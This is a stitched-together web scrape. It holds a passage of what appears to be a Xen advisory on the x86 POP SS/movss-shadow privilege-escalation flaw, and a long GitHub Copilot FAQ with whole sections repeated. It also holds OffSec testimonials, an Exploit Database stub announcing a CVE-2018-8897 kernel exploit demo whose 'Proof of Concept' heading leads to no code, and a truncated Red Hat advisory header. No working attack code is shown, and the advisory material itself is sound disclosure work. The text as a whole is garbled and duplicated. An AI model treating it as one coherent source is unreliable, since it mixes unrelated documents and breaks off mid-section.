and stack pointer.  To allow an atomic update from what would otherwise
be two adjacent instructions, an update which changes the stack segment
(either a mov or pop instruction with %ss encoded as the destination
register) sets the movss shadow for one instruction.

The exact behaviour of the movss shadow is poorly understood.

In practice, a movss shadow delays some debug exceptions (e.g. from a
hardware breakpoint) until the subsequent instruction has completed.  If
the subsequent instruction normally transitions to supervisor mode
(e.g. a system call), then the debug exception will be taken after the
transition to ring0 is completed.

For most transitions to supervisor mode, this only confuses Xen into
printing a lot of debugging information.  For the syscall instruction
however, the exception gets taken before the syscall handler can move
off the guest stack.

IMPACT
======

A malicious PV guest can escalate their privilege to that of the
hypervisor.

VULNERABLE SYSTEMS
==================

All versions of Xen are vulnerable.

Only x86 systems are vulnerable.  ARM systems are not vulnerable.

Only x86 PV guests can exploit the vulnerability.  x86 HVM and PVH
guests cannot exploit the vulnerability.

An attacker needs to be able to control hardware debugging facilities to
exploit the vulnerability, but such permissions are typically available
to unprivileged users.

MITIGATION
==========

Running only HVM or PVH guests avoids the vulnerability.

Note however that a compromised device model (running in dom0 or a
stub domain) can carry out this attack, so users with HVM domains are
also advised to patch their systems.

CREDITS
=======

This issue was discovered by Andy Lutomirski, and Nick Peterson of Everdox
Tech LLC.

RESOLUTION
==========

Applying the appropriate attached patch resolves this issue.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)

**Vulnerable App:**

```
Demo exploitation of the POP SS vulnerability (CVE-2018-8897), leading to unsigned code execution with kernel privilages.

- KVA Shadowing should be disabled and the relevant security update should be uninstalled.
- This may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3.

Proof of Concept:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# RHSA-2018:1349 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Moderate: kernel security and bug fix update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A1349)

## Topic

